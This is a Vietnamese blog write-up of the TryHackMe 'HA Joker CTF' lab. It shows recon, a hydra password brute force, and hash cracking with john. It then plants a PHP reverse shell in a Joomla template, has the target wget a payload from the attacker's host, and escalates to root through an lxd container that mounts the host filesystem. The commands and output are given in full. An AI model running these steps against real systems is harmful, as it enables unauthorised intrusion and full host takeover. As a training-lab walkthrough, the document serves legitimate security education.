---
layout: post
author: "Neo"
title: "Tryhackme - HA Joker CTF"
date: "2022-05-01"
tags: [
    "tryhackme",
    "linux",
    "web",
	"joomla",
	"brute-force",
	"hydra",
	"lxd",	
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2022-05-01-THM-HA-Joker-CTF/1.webp)

Xin chào, lại là tôi đây. Hôm nay tôi sẽ giải CTF [TryHackMe | HA Joker CTF](https://tryhackme.com/room/jokerctf)
## Reconnaissance

Vẫn như thông thường, việc đầu tiên cần làm quét các cổng đang mở trên máy chủ mục tiêu

```python
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad201ff4331b0070b385cb8700c4f4f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL89x6yGLD8uQ9HgFK1nvBGpjT6KJXIwZZ56/pjgdRK/dOSpvl0ckMaa68V9bLHvn0Oerh2oa4Q5yCnwddrQnm7JHJ4gNAM+lg+ML7+cIULAHqXFKPpPAjvEWJ7T6+NRrLc9q8EixBsbEPuNer4tGGyUJXg6GpjWL5jZ79TwZ80ANcYPVGPZbrcCfx5yR/1KBTcpEdUsounHjpnpDS/i+2rJ3ua8IPUrqcY3GzlDcvF7d/+oO9GxQ0wjpy1po6lDJ/LytU6IPFZ1Gn/xpRsOxw0N35S7fDuhn69XlXj8xiDDbTlOhD4sNxckX0veXKpo6ynQh5t3yM5CxAQdqRKgFF
|   256 1bf9a8ecfd35ecfb04d5ee2aa17a4f78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOzF9YUxQxzgUVsmwq9ZtROK9XiPOB0quHBIwbMQPScfnLbF3/Fws+Ffm/l0NV7aIua0W7FLGP3U4cxZEDFIzfQ=
|   256 dcd7dd6ef6711f8c2c2ca1346d299920 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLWfYB8/GSsvhS7b9c6hpXJCO6p1RvLsv4RJMvN4B3r
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: Joker
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    syn-ack Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

__What version of Apache is it?: 2.4.29__

__What port on this machine not need to be authenticated by user and password? 80__

Với file ẩn, tôi sử dụng *dirsearch* và thêm extension txt, php, bak. Tồi tìm được path ẩn là __secret.txt__

Cũng bằng cách này tôi tìm được file hệ thống là __phpinfo.php__

## Enumeration 

Khi chuyển sang port 8080, tôi có username *joker* và phải tìm password để đăng nhập. Sau khi dùng Burp để bắt request thì tôi nhận ra phương thức được sử dụng là http-get chứ không phải post

![burp](/assets/img/2022-05-01-THM-HA-Joker-CTF/2.webp)

Sử dụng *hydra* để bruteforce password của user *joker*

```python
┌──(kali㉿kali)-[~]
└─$ hydra -l joker -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-70.txt -s 8080 10.10.17.48 http-get
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

...

[DATA] max 16 tasks per 1 server, overall 16 tasks, 42660 login tries (l:1/p:42660), ~2667 tries per task
[DATA] attacking http-get://10.10.17.48:8080/
[8080][http-get] host: 10.10.17.48   login: joker   password: hannah
```

Sau khi đăng nhập thành công, tôi được đưa đến 1 trang blog sử dụng Joomla CMS. 

![blog-joomla](/assets/img/2022-05-01-THM-HA-Joker-CTF/3.webp)

Thử truy cập vào *robots.txt* tôi tìm thấy các path hệ thống, 1 trong số đó là */administrator/*

Tuy nhiên muốn truy cập vào admin tôi cũng phải đăng nhập. Để tìm xem có gì thú vị ở path tôi sẽ sử dụng lại *dirsearch* với user password của *joker*

```python
┌──(kali㉿kali)-[~]
└─$ dirsearch -u 10.10.247.23:8080 --auth-type basic --auth joker:hannah -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e txt,bak,zip,php 
...
[22:45:51] 200 -   12MB - /backup 
...
```

Tôi tìm thấy file *backup.zip*

Để giải nén thì cần phải có password và khi tôi thử password của *joker* là hannah thì được luôn. Bên trong backup tôi có file db và site backup.

Phân tích file sql này tôi tìm thấy super duper user 

```sql
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
```

Lưu đoạn hash này vào 1 file và dùng *john* để crack nó

```python
┌──(kali㉿kali)-[~/Downloads/site]
└─$ john hash.txt         
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
abcd1234         (?) 
```

Sau khi đăng nhập, tôi có giao diện quản trị joomla. Bây giờ thì upload revershell thôi. 

*Extensions -> Templates -> Templates -> beez3*

![beez3](/assets/img/2022-05-01-THM-HA-Joker-CTF/4.webp)

Tôi sẽ xóa hết nội dung và thay đổi bằng code shell của mình. Vẫn là shell php thần thánh của *pentestmonkey* thôi. 

Thay đổi giá trị IP và Port thành máy local của mình, sau đó save nó lại. Vì tôi thay đổi file *index.php* trong template *beez3* nên cũng phải vào url này thì mới kích hoạt được shell. Và tất nhiên trước đó tôi phải tạo listener với port đã cấu hình trong code shell

`http://IP:8080/templates/beez3/index.php`

Quay lại listener

```python
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 2402                             
listening on [any] 2402 ...
connect to [10.6.0.191] from (UNKNOWN) [10.10.198.35] 35612
Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 19:30:22 up 11 min,  0 users,  load average: 0.00, 0.20, 0.27
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
bash: cannot set terminal process group (632): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
www-data@ubuntu:/$ 
```

## Privilege escalation

Tôi để ý user này có trong group lxd. Nói qua 1 chút về lxd thì nó giống như docker sử dụng các container để đóng gói môi trường, nhưng nhẹ hơn và cho tốc độ cao hơn. 

Tôi sẽ sử dụng cách leo thang đặc quyền với lxd được trình bày ở [đây](https://exploit-notes.hdks.org/exploit/lxc-lxd-privilege-escalation/)

Đầu tiên tạo image mới trên máy local 

`git clone https://github.com/saghul/lxd-alpine-builder.git`

`cd lxd-alpine-builder`

`sudo ./build-alpine`

Sau khi thực hiện build xong, kiểm tra lại file *.tar.gz* vừa tạo

```python
┌──(kali㉿kali)-[~/lxd-alpine-builder]
└─$ ll
total 3732
-rw-r--r-- 1 root root 3776904 Dec 26 23:08 alpine-v3.17-x86_64-20221226_2308.tar.gz
-rwxr-xr-x 1 kali kali    8060 Dec 26 23:06 build-alpine
-rw-r--r-- 1 kali kali   26530 Dec 26 23:06 LICENSE
-rw-r--r-- 1 kali kali     768 Dec 26 23:06 README.md
```

Sau đó tạo http local server trên máy local và từ máy remote thực hiện lấy file alpine vừa tạo

```python
┌──(kali㉿kali)-[~/lxd-alpine-builder]
└─$ python -m http.server                
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```

```python
www-data@ubuntu:/tmp$ wget http://10.6.0.191:8000/alpine-v3.17-x86_64-20221226_2308.tar.gz
<0.191:8000/alpine-v3.17-x86_64-20221226_2308.tar.gz
http://10.6.0.191:8000/alpine-v3.17-x86_64-20221226_2308.tar.gz
Connecting to 10.6.0.191:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3776904 (3.6M) [application/gzip]
Saving to: 'alpine-v3.17-x86_64-20221226_2308.tar.gz'
```

Import image mới này với tên __privesc__

```python
www-data@ubuntu:/tmp$ lxc image import ./alpine-v3.17-x86_64-20221226_2308.tar.gz --alias privesc
<e-v3.17-x86_64-20221226_2308.tar.gz --alias privesc
Image imported with fingerprint: 6f955b8c349dff3536f22249c66a037f172efcc113b97a54cf35ccb380631654
```

Kiểm tra xem image đã import thành công chưa

```python
www-data@ubuntu:/tmp$ lxc image list
lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| privesc | 6f955b8c349d | no     | alpine v3.17 (20221226_23:08) | x86_64 | 3.60MB | Dec 27, 2022 at 8:31am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
```

Tạo container mới có tên __priv__ từ image __privesc__ 

```python
www-data@ubuntu:/tmp$ lxc init privesc priv -c security.privileged=true
lxc init privesc priv -c security.privileged=true
Creating priv
```

Mount container vừa tạo đến thư mục *root*

```python
www-data@ubuntu:/tmp$ lxc config device add priv mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to priv
```

Bây giờ thì chạy container này

```python
www-data@ubuntu:/tmp$ lxc start priv
lxc start priv
www-data@ubuntu:/tmp$ lxc exec priv /bin/sh
lxc exec priv /bin/sh
~ id
id
uid=0(root) gid=0(root)
~ ls /mnt/root/root
ls /mnt/root/root
final.txt
~ cat /mnt/root/root/final.txt

     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                         
!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
```

